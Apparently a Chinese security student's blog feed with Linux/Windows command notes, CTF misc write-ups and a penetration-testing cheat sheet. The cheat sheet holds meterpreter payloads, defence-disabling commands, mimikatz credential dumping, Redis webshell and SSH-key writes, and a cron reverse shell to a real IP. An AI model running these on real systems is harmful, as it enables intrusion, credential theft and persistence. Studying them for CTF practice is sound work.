    <content type="html"><![CDATA[<p>linux命令</p><h3 id="MD5sum"><a href="#MD5sum" class="headerlink" title="MD5sum"></a>MD5sum</h3><p>算MD5 sha之类</p><p>类型加上sum 例如 md5sum sha256sum 之类</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">echo</span> -n <span class="hljs-string">&#x27;EU4EkcST8xWjIsUj1wovCw==&#x27;</span> | <span class="hljs-built_in">md5sum</span> | <span class="hljs-built_in">cut</span> -d <span class="hljs-string">&#x27; &#x27;</span> -f1<br></code></pre></td></tr></table></figure><p>这个是算字符串的<br>md5sum xxx.txt 这个是算文件的</p><h3 id="更换python-java版本"><a href="#更换python-java版本" class="headerlink" title="更换python java版本"></a>更换python java版本</h3><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs arduino">update-alternatives --config java  <span class="hljs-comment">//更换java版本</span><br></code></pre></td></tr></table></figure><h3 id="find查找文件"><a href="#find查找文件" class="headerlink" title="find查找文件"></a>find查找文件</h3><p>find &#x2F; -name “flag”</p><p><a href="https://blog.csdn.net/l_liangkk/article/details/81294260">Linux下find命令详解_linux find 命令-CSDN博客</a></p><p><a href="https://blog.csdn.net/crisprx/article/details/104110725">小记 SUID find提权-CSDN博客</a></p><h3 id="tar-解压"><a href="#tar-解压" class="headerlink" title="tar(解压)"></a>tar(解压)</h3><p>tar –xvf file.tar  解压 tar包<br>tar -xzvf file.tar.gz 解压tar.gz<br>tar -xjvf file.tar.bz2   解压 tar.bz2<br>tar –xZvf file.tar.Z   解压tar.Z<br>unrar e file.rar 解压rar<br>unzip file.zip 解压zip</p><p>tar –cvf jpg.tar *.jpg  将目录里所有jpg文件打包成tar.jpg<br>tar –czf jpg.tar.gz *.jpg   将目录里所有jpg文件打包成jpg.tar后，并且将其用gzip压缩，生成一个gzip压缩过的包，命名为jpg.tar.gz<br>tar –cjf jpg.tar.bz2 *.jpg 将目录里所有jpg文件打包成jpg.tar后，并且将其用bzip2压缩，生成一个bzip2压缩过的包，命名为jpg.tar.bz2<br>tar –cZf jpg.tar.Z *.jpg   将目录里所有jpg文件打包成jpg.tar后，并且将其用compress压缩，生成一个umcompress压缩过的包，命名为jpg.tar.Z<br>rar a jpg.rar *.jpg rar格式的压缩，需要先下载rar for linux<br>zip jpg.zip *.jpg   zip格式的压缩，需要先下载zip for linux</p><h3 id="xargs（批量处理流文件）"><a href="#xargs（批量处理流文件）" class="headerlink" title="xargs（批量处理流文件）"></a>xargs（批量处理流文件）</h3><figure class="highlight excel"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs excel"><span class="hljs-built_in">find</span> ./ -name <span class="hljs-string">&quot;*.rst&quot;</span> | xargs  -I %  sh -c &#x27;pandoc % -f rst -<span class="hljs-built_in">t</span> markdown -o %.md<br><br></code></pre></td></tr></table></figure><p>-I % 代表将前面的文件名流用%来代替</p>]]></content>
    
    
    <categories>
      
      <category>Penetration</category>
      
    </categories>
    
    
    <tags>
      
      <tag>渗透测试</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>windows命令</title>
    <link href="/2023/12/17/penetration/windows%E5%91%BD%E4%BB%A4/"/>
    <url>/2023/12/17/penetration/windows%E5%91%BD%E4%BB%A4/</url>
    
    <content type="html"><![CDATA[<p>切换目录方法：输入 cd &#x2F;d E:</p><p>进入E盘其他文件夹：cd E:\文件夹</p><p>dir &#x2F;b 可以查看当前路径下的所有文件和文件夹。<br>dir &#x2F;b &#x2F;s 可以查看当前路径下的所有文件和文件夹以及子目录下的文件。</p><p>关闭防火墙：netsh firewall set opmode mode&#x3D;disable<br>关闭防火墙： netsh advfirewall set allprofiles state off<br>查看防火墙状态： netsh advfirewall show allprofiles</p><p>防火墙恢复默认配置：netsh firewall reset</p><p>关闭windows任意服务 net stop *** （net stop windefend 关闭windows自带杀毒软件windows defender）</p><p>mstsc &#x2F;console 或mstsc &#x2F;f 开启远程连接（适用于mimikatza抓到了域控管理员密码用）</p>]]></content>
    
    
    <categories>
      
      <category>Penetration</category>
      
    </categories>
    
    
    <tags>
      
      <tag>渗透测试</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>rubbish</title>
    <link href="/2023/12/17/penetration/%E6%9D%82%E4%B8%83%E6%9D%82%E5%85%AB%E6%B1%87%E6%80%BB/"/>
    <url>/2023/12/17/penetration/%E6%9D%82%E4%B8%83%E6%9D%82%E5%85%AB%E6%B1%87%E6%80%BB/</url>
    
    <content type="html"><![CDATA[<h2 id="msf"><a href="#msf" class="headerlink" title="msf"></a>msf</h2><p>千万不要exit 撑死back和background</p><p>首先判断需要反弹还是正向连接</p><p>一般能出网的用反弹，出不了网的就正向</p><p>1、先制作payload </p><p>linux</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">msfvenom -p linux/x64/meterpreter/reverse_tcp lhost=xx.xx.xx.xx lport=9999 -f elf &gt;reverse_9999.elf <span class="hljs-comment">#反弹</span><br>msfvenom -p linux/x64/meterpreter/bind_tcp lport=9999 -f elf &gt;bind_9999.elf<span class="hljs-comment">#正向</span><br></code></pre></td></tr></table></figure><p>windows</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs routeros">msfvenom -p windows/meterpreter/reverse_tcp <span class="hljs-attribute">lhost</span>=xx.xx.xx.xx <span class="hljs-attribute">lport</span>=9999 -f exe &gt;reverse_9999.exe #反弹<br>msfvenom -p windows/meterpreter/bind_tcp <span class="hljs-attribute">lport</span>=9999 -f exe &gt;bind_9999.exe#正向<br></code></pre></td></tr></table></figure><p>linux 一般为elf windows为exe   （在杀软能绕过用，这两为可执行文件</p><p>2、上传payload</p><p>如果有网站可以用蚁剑上传</p><p>如果linux中可以用</p><p>VPS上 python3 -m http.server 12345 开启一个web服务供下载</p><p>靶机上 wget <a href="http://xx.xx..xx.xx:12345/xx.elf">http://xx.xx..xx.xx:12345/xx.elf</a> 下载</p><p>如果在windows上可以用 certutil <a href="https://zhuanlan.zhihu.com/p/107819644">Windows上自带的渗透测试工具：Certutil</a></p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs text">certutil.exe -urlcache -split -f http://example.com/a.txt<br></code></pre></td></tr></table></figure><p>如果在域控中可以用$LCK (待补充)</p><p>然后上线msf</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs bash">msfconsole<br><br>use exploit/multi/handler<br><br>show options <span class="hljs-comment">#看一下需要的payload 根据要填的填rhost lport</span><br><br><span class="hljs-built_in">set</span> payload linux/x64/meterpreter/reverse_tcp <span class="hljs-comment">#这步根据生成的payload进行填写</span><br><br><span class="hljs-built_in">set</span> lport  xxxx<br><br><span class="hljs-built_in">set</span> rhost xx.xx.xx.xx <span class="hljs-comment">#根据上面options选填</span><br><br>run<br></code></pre></td></tr></table></figure><p>执行payload文件 正向先开 反弹后开</p><p>上线以后首先获取路由信息 为后面跨网段渗透铺路</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-built_in">run</span> autoroute<br><br><span class="hljs-built_in">run</span> post/multi/manage/autoroute<br><br><span class="hljs-built_in">run</span> autoroute -p#查看所有路由表<br></code></pre></td></tr></table></figure><p>退出当前sessions 用</p><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs arduino">background<br></code></pre></td></tr></table></figure><p>查看所有sessions 用</p><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">sessions</span> <br></code></pre></td></tr></table></figure><p>使用某个session </p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs css">sessions -<span class="hljs-selector-tag">i</span> x -k（杀死清除）<br></code></pre></td></tr></table></figure><p>设置socks代理</p><figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gams"><span class="hljs-keyword">set</span> Proxies <span class="hljs-comment">socks5:127.0.0.1:1081</span><br></code></pre></td></tr></table></figure><h2 id="利用ipc管道-和sc的横向移动"><a href="#利用ipc管道-和sc的横向移动" class="headerlink" title="利用ipc管道 和sc的横向移动"></a>利用ipc管道 和sc的横向移动</h2><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">net</span> use \\<span class="hljs-number">192.168.93.30</span>\ipc$ <span class="hljs-string">&quot;Whoami2021&quot;</span> /user:<span class="hljs-string">&quot;Administrator&quot;</span><br><br>sc \\<span class="hljs-number">192.168.93.30</span> create unablefirewall binpath=<span class="hljs-string">&quot;netsh advfirewall set allprofiles state off&quot;</span><br><br>sc \\<span class="hljs-number">192.168.93.30</span> start unablefirewall<br></code></pre></td></tr></table></figure><h2 id="mimikatz"><a href="#mimikatz" class="headerlink" title="mimikatz"></a>mimikatz</h2><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs arduino">提升权限   privilege::debug<br><br>抓取明文密码 sekurlsa::logonpasswords<br></code></pre></td></tr></table></figure><p>win12及以上被取消了，可通过修改注册表设置允许存储明文密码，并让其系统强制锁屏，等待管理员重新输入账号密码后，即可抓取到明文密码。</p><p>修改注册表(管理员权限)</p><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dockerfile">reg <span class="hljs-keyword">add</span><span class="language-bash"> HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential /t REG_DWORD /d 1</span><br></code></pre></td></tr></table></figure><p>powershell执行命令强制锁屏</p><figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs arcade"><span class="hljs-keyword">Function</span> <span class="hljs-title function_">Lock</span>-<span class="hljs-title function_">WorkStation</span> &#123; <span class="hljs-symbol">$sig</span>nature = @<span class="hljs-string">&quot; [DllImport (&quot;</span>user32.dll<span class="hljs-string">&quot;, SetLastError = true)] public static extern bool LockWorkStation(); &quot;</span>@ <span class="hljs-symbol">$Loc</span>kWorkStation = Add-Type -memberDefinition <span class="hljs-symbol">$sig</span>nature -name <span class="hljs-string">&quot;Win32LockWorkStation&quot;</span> -namespace Win32Functions -passthru <span class="hljs-symbol">$Loc</span>kWorkStation::LockWorkStation() | Out-<span class="hljs-literal">Null</span> &#125; Lock-WorkStation<br></code></pre></td></tr></table></figure><h2 id="redis"><a href="#redis" class="headerlink" title="redis"></a>redis</h2><p><a href="https://keanes.blog.csdn.net/article/details/127753716">Redis未授权四种利用方式与修复方案</a></p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs routeros">Redis基本操作<br><br><span class="hljs-built_in">set</span> testkey “hello” - 创建一个键值对<br>keys * 显示所有键<br>delxxx 删除键为key的数据<br><span class="hljs-built_in">get</span> xxx 读key的内容<span class="hljs-built_in"></span><br><span class="hljs-built_in">config </span><span class="hljs-built_in">set</span> dir /home/test 设置工作目录<span class="hljs-built_in"></span><br><span class="hljs-built_in">config </span><span class="hljs-built_in">set</span> dbfilename redis.rdb 设置备份为减价<br>save 进行一次备份操作<br></code></pre></td></tr></table></figure><h4 id="redis主从复制RCE"><a href="#redis主从复制RCE" class="headerlink" title="redis主从复制RCE"></a>redis主从复制RCE</h4><p>漏洞存在于4.x、5.x版本中，Redis提供了主从模式，主从模式指一个redis作为主机，其他为备份机，主从数据相同，从机去读，主机写。在Redis4.x之后，通过外部扩展，可以实现redis中实现一个新的redis命令，构造恶意.so文件，在两个redis实例设置主从模式，redis主机实例可以通过FULLRESYNC同步文件到从机上，在从机家在恶意so文件，从而执行文件。</p><p>影响版本：redis&lt;&#x3D;5.05<br>工具下载：<br><a href="https://github.com/n0b0dyCN/redis-rogue-server">https://github.com/n0b0dyCN/redis-rogue-server</a>  (&#x2F;root&#x2F;tool&#x2F;poc&#x2F;applicationserver&#x2F;redis-rogue-server-master&#x2F;)</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">python3</span> redis-rogue-server.py --rhost <span class="hljs-number">192.168.0.109</span> --lhost <span class="hljs-number">192.168.0.145</span><br></code></pre></td></tr></table></figure><p><img src="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/image-20240123142200112.png" alt="image-20240123142200112"></p><p>弹一个shell去vps上</p><p><img src="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/image-20240123142235121.png" alt="image-20240123142235121"></p><h4 id="Redis写WEBSHELL"><a href="#Redis写WEBSHELL" class="headerlink" title="Redis写WEBSHELL"></a>Redis写WEBSHELL</h4><p>需要知道网站物理路径</p><p>获取网站路径方式：1、报错 2、phpinfo 3、配置文件 4、 数据库 5、相关数据泄漏</p><figure class="highlight php-template"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php-template"><span class="language-xml">redis:6379&gt; config set dir /var/www/html/</span><br><span class="language-xml">redis:6379&gt; config set dbfilename shell.php</span><br><span class="language-xml">redis:6379&gt; set x &quot;</span><span class="language-php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-title function_ invoke__">phpinfo</span>();<span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;ant&#x27;</span>]);<span class="hljs-meta">?&gt;</span></span><span class="language-xml">&quot;</span><br><span class="language-xml">redis:6379&gt; save</span><br></code></pre></td></tr></table></figure><h4 id="Redis写入ssh公钥登录"><a href="#Redis写入ssh公钥登录" class="headerlink" title="Redis写入ssh公钥登录"></a>Redis写入ssh公钥登录</h4><p>利用条件：<br>1、Redis服务使⽤ROOT账号启动、且可未授权登陆<br>2、服务器开放了SSH服务，⽽且允许使⽤密钥登录，即可远程写⼊⼀个公钥，直接登录远程 服务器。<br>生成密钥公钥</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs awk">ssh-keygen -t rsa<br><br>(echo -e <span class="hljs-string">&quot;\n\n&quot;</span>; cat id_rsa.pub; echo -e <span class="hljs-string">&quot;\n\n&quot;</span>) &gt; test.txt <span class="hljs-comment">#将公钥id_rsa.pub文件写入test.txt文件</span><br><br>cat test.txt | redis-cli -h <span class="hljs-number">192.168</span>.<span class="hljs-number">220.129</span> -x set crack<br><br><br>redis-cli -h xx.xx.xx.xx<br><br>config set dir <span class="hljs-regexp">/root/</span>.ssh <span class="hljs-comment">#这步需要redis服务使用root权限开启 否则更改不了路径</span><br><br>config set dbfilename authorized_keys<br><br>save<br><br><span class="hljs-keyword">exit</span><br><br><br>cd <span class="hljs-regexp">/root/</span>.ssh<br><br>ssh -i id_rsa root@<span class="hljs-number">172.17</span>.<span class="hljs-number">137.102</span><br></code></pre></td></tr></table></figure><h4 id="反弹shell"><a href="#反弹shell" class="headerlink" title="反弹shell"></a>反弹shell</h4><figure class="highlight swift"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs swift"><span class="hljs-keyword">set</span> shell <span class="hljs-string">&quot;<span class="hljs-subst">\n</span><span class="hljs-subst">\n</span>*/1 * * * * /bin/bash -i&gt;&amp;/dev/tcp/38.22.133.155/3333 0&gt;&amp;1<span class="hljs-subst">\n</span><span class="hljs-subst">\n</span>&quot;</span><br>config <span class="hljs-keyword">set</span> dir <span class="hljs-regexp">/var/</span>spool<span class="hljs-regexp">/cron/</span><br>config <span class="hljs-keyword">set</span> dbfilename root<br>save<br></code></pre></td></tr></table></figure><h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><h3 id="suid提权"><a href="#suid提权" class="headerlink" title="suid提权"></a>suid提权</h3><p>查找具有suid权限的文件</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs text">find / -user root -perm -4000 -print 2&gt;/dev/null<br>find / -perm -u=s -type f 2&gt;/dev/null<br>find / -user root -perm -4000 -exec ls -ldb &#123;&#125; ;<br></code></pre></td></tr></table></figure><h3 id="UDF提权"><a href="#UDF提权" class="headerlink" title="UDF提权"></a>UDF提权</h3>]]></content>
    
    
    <categories>
      
      <category>Penetration</category>
      
    </categories>
    
    
    <tags>
      
      <tag>渗透测试</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>misc刷题（杂七杂八）</title>
    <link href="/2023/07/10/misc/1/"/>
    <url>/2023/07/10/misc/1/</url>
    
    <content type="html"><![CDATA[<h2 id="CISCN-2022-初赛-ez-usb"><a href="#CISCN-2022-初赛-ez-usb" class="headerlink" title="[CISCN 2022 初赛]ez_usb"></a>[CISCN 2022 初赛]ez_usb</h2><p>这道题已经提示是一道usb流量分析题</p><p><a href="https://blog.51cto.com/u_15400016/4288275">USB流量取证分析</a></p><blockquote><p>HID（Human Interface Device，人机接口设备）是USB设备中常用的<a href="https://www.usbzh.com/article/detail-273.html">设备类型</a>，是直接与人交互的USB设备，例如键盘、鼠标与游戏杆等。在USB设备中，HID设备的成本较低。另外，HID设备并不一定要有人机交互功能，只要符合HID类别规范的设备都是HID设备。</p></blockquote><p><img src="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202307241723667.png" alt="image-20230724172358412"></p><p>usbhid.data先筛选有hid的流量 一般来讲是键盘、鼠标、游戏杆</p><p>有三组2.8.1  ，2.4.1，2.10.1</p><p>分别把他们重组</p><p>2.4.1的流量包中包数据长度为0 应该是一个混淆包</p><p><img src="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202307250837270.png" alt="image-20230725083740988"></p><p>一般usb流量隐写，要么键盘隐写，或者是鼠标隐写</p><p>将其放入usb键盘鼠标流量脚本跑 此处使用的是</p><p><img src="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202307250840287.png" alt="image-20230725084033262"></p><blockquote><p>2.8.1</p></blockquote><p><img src="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202307250840080.png" alt="image-20230725084009040"></p><p>将其中的CAP和DEL删除 </p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">JPEG</span>文件头FFD8FFE0 <span class="hljs-number">00104</span>A46,JPEG文件结尾为FFD9,rar的文件尾C43D7B00 <span class="hljs-number">400700</span>,文件头<span class="hljs-number">52617221</span> <span class="hljs-number">1</span>A0700即Rar!,ZIP文件头<span class="hljs-number">504</span>B0304 <span class="hljs-number">0</span>A00即PK,GIF开头`<span class="hljs-number">47494638</span> <span class="hljs-number">396</span>即GIF,PNG文件头<span class="hljs-number">89504</span>E47 <span class="hljs-number">0</span>D0A1A0A <span class="hljs-number">0000000</span>D <span class="hljs-number">49</span>即|PNG,PNG文件结尾<span class="hljs-number">49454</span>E44 AE426082即IEND bmp文件头<span class="hljs-number">424</span>D即BM<br></code></pre></td></tr></table></figure><p>文件头显示是rar文件，导入010editor 重新导出文件 （注意代码块十六进制需要ctrl+shift+v整段复制）</p><blockquote><p>2.10.1</p></blockquote><p><img src="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202307250845852.png"></p><p>这个猜测是rar文件密码</p><h2 id="CISCN-2018-Picture"><a href="#CISCN-2018-Picture" class="headerlink" title="[CISCN 2018]Picture"></a>[CISCN 2018]Picture</h2><p>拿到题目首先想着binwalk分离文件</p><p><img src="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202307251003939.png" alt="image-20230725100342848"></p><p>分离以后文件发现文件有base64编码可能</p><p><img src="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202307251007833.png" alt="image-20230725100758799"></p><p>这边我先解了一遍</p><p><img src="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202307251014228.png" alt="image-20230725101417193"></p><p>kp开头中间也有pk 考点是文件头混肴，但是这个没法直接换成十六进制</p><p>可以使用在线工具<a href="https://base64.us/">Base64 在线编码解码 </a></p><p>直接换成十六进制导入010editor然后修改文件头导出zip文件</p><p><img src="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202307251021568.png" alt="image-20230725102139482"></p><p>注释中&lt;- password啊是提示 然后根据前面的报错提示可以得到密码： integer division or modulo by zero</p><p><img src="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202307251023848.png" alt="image-20230725102327781"></p><p>解压文件得到俩文件 一个假flag 另一个文件是编码</p><p><img src="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202307251028642.png" alt="image-20230725102808612"></p><p>直接扔工具里面去跑了</p><p><img src="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202307251029722.png" alt="image-20230725102923662"></p><p>是uuencode编码</p><h2 id="CISCN-2023-初赛-被加密的生产流量"><a href="#CISCN-2023-初赛-被加密的生产流量" class="headerlink" title="[CISCN 2023 初赛]被加密的生产流量"></a>[CISCN 2023 初赛]被加密的生产流量</h2><p>流量包的名字就是modbus 猜测与modbus有关 追踪tcp流 看隐写的内容</p><p><img src="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202307251114676.png" alt="image-20230725111431413"></p><p>有等号是base编码 可以使用pyshark脚本跑切割，或者就是手动一个一个写下来这个</p><p>放进解码器跑就行了</p><p><img src="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202307251418825.png" alt="image-20230725141828416"></p><h2 id="CISCN-2022-初赛-everlasting-night"><a href="#CISCN-2022-初赛-everlasting-night" class="headerlink" title="[CISCN 2022 初赛]everlasting_night"></a>[CISCN 2022 初赛]everlasting_night</h2><p>一道lsb隐写题</p><p>首先打开010editor 查看这张png图片的hex 文件头和文件尾是全的 文件尾之后还有一串十六进制</p><p><img src="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202307281102581.png" alt="image-20230728110233535"></p><p>32位 ？？？  md5 解密</p><p><img src="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202307281107876.png" alt="image-20230728110753829"></p><p>ohhWh04m1 不知道是什么东西 先留着再说</p><p>stegsolve 打开图片 发现在alpha 通道2里面发现一点不对 </p><p><img src="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202307281111490.png" alt="image-20230728111136364"></p><p>用data extract 打开alpha通道通道2  以列</p><p><img src="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202307281117018.png" alt="image-20230728111757955">  </p><p>是有一串字符串的 还是不知道要用来干什么 </p><p>学lsb隐写  那就跑脚本了 上面的字符串是lsb隐写的密码 </p><p><img src="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202307281123269.png" alt="image-20230728112352233"></p><p>先导了一份文本文件，pk文件头 导一份zip出来</p><p><img src="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202307281123857.png" alt="image-20230728112306789"></p><p>zip解压缩有密码，拿第一个密码解压 出了一个flag文件 看格式应该是png 但是文件损坏</p><p>看wp 需要用gimp打开 并且需要改一下后缀名为data</p><p><code>gimp flag.data</code></p><p>改一点宽度 就出来了</p><p><img src="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202307281127822.png" alt="image-20230728112729732"></p><h2 id="CISCN-2023-初赛-pyshell"><a href="#CISCN-2023-初赛-pyshell" class="headerlink" title="[CISCN 2023 初赛]pyshell"></a>[CISCN 2023 初赛]pyshell</h2><p>给了网址，node1.anna.nssctf.cn:28159，并且有端口，</p><p>nc直接连接 ，发现是python shell</p><p>这里使用 Python REPL 的特性，下划线表示上一次求值的结果，使用逐个字符拼接的方式将 eval 所需的字符串拼接出来</p><p><img src="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202308041610304.png" alt="image-20230804161015171"></p><p>引入pwn python包， 我不记得脚本在哪了 但是因为好像反弹的shell进程连接时间很短 不够直接一个一个在shell里面打出来的，所以写个脚本sleep（1）一次性全发出去</p><h2 id="2023-ciscnpuzzle"><a href="#2023-ciscnpuzzle" class="headerlink" title="2023 ciscnpuzzle"></a>2023 ciscnpuzzle</h2><p>一道bmp图片拼图题 </p><p>就是把裁剪下来的bmp小图片拼成大图片，然后把小图片在原图片中的位置信息隐写在了bmp保留字段里 </p><p><img src="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202309142059498.png" alt="image-20230914205921370"></p><p>bfReserved1 和2 里</p><p>首先根据隐写的位置信息对列表size排序 </p><p>计算图片的总高度，取最大的位置信息的纵坐标加上对应尺寸的高度。</p><p>计算图片的总宽度，取最大的位置信息的横坐标加上对应尺寸的宽度。</p><p>关于bmp文件头结构写在了文件结构刷题里了</p><p><img src="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202309142103829.png" alt="image-20230914210339756"></p><p>脚本跑出文件高度和宽度 为下一步拼图做准备</p>]]></content>
    
    
    <categories>
      
      <category>Misc</category>
      
    </categories>
    
    
    <tags>
      
      <tag>ctfshow</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>相关工具使用（未整理版）</title>
    <link href="/2023/07/05/tool/1/"/>
    <url>/2023/07/05/tool/1/</url>
    
    <content type="html"><![CDATA[<h1 id="Audacity"><a href="#Audacity" class="headerlink" title="Audacity"></a>Audacity</h1><p>音频处理软件，常用于查看音频隐写，类似摩斯密码等</p><p>首先打开文件，然后观察是否有多个音轨，然后观察音轨中是否有摩斯密码等相关的信息（长短）</p><p><img src="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202307241441432.png" alt="image-20230724144117152"></p><p>然后对照这翻译</p><p><img src="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202307241445142.png" alt="image-20230724144501063"></p><h1 id="msf的使用"><a href="#msf的使用" class="headerlink" title="msf的使用"></a>msf的使用</h1><figure class="highlight hsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs hsp">Kali中MSF中session相关命令：<br><br>sessions    –h 查看帮助<br>sessions -i &lt;ID值&gt;  <span class="hljs-meta">#进入会话  </span><br><br> -k  杀死会话<br>background  <span class="hljs-meta">#将当前会话放置后台</span><br><span class="hljs-keyword">run</span>  <span class="hljs-meta">#执行已有的模块，输入run后按两下tab，列出已有的脚本</span><br>info    <span class="hljs-meta">#查看已有模块信息</span><br>getuid <span class="hljs-meta">#查看权限 </span><br>getpid <span class="hljs-meta">#获取当前进程的pid</span><br><span class="hljs-keyword">sysinfo</span> <span class="hljs-meta">#查看目标机系统信息</span><br>ps <span class="hljs-meta">#查看当前活跃进程   </span><br><br>kill <span class="hljs-meta">#&lt;PID值&gt; 杀死进程</span><br>idletime <span class="hljs-meta">#查看目标机闲置时间</span><br>reboot<span class="hljs-meta">#重启</span><br>shutdown   <span class="hljs-meta">#关机</span><br>shell <span class="hljs-meta">#进入目标机<span class="hljs-keyword">CMD</span>窗口</span><br></code></pre></td></tr></table></figure><h2 id="反弹加提权的一般步骤"><a href="#反弹加提权的一般步骤" class="headerlink" title="反弹加提权的一般步骤"></a>反弹加提权的一般步骤</h2><p>首先先用msfvenom生成攻击载荷</p><p><code>msfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.0.109 lport=12345 -f exe &gt;s.exe</code></p><p>上传载荷致服务器端，要选一个可以执行的目录文件，用wt.asp先扫一遍目录先看看</p><p>然后拿ASPXSpy2014.aspx（admin）执行文件</p><p><img 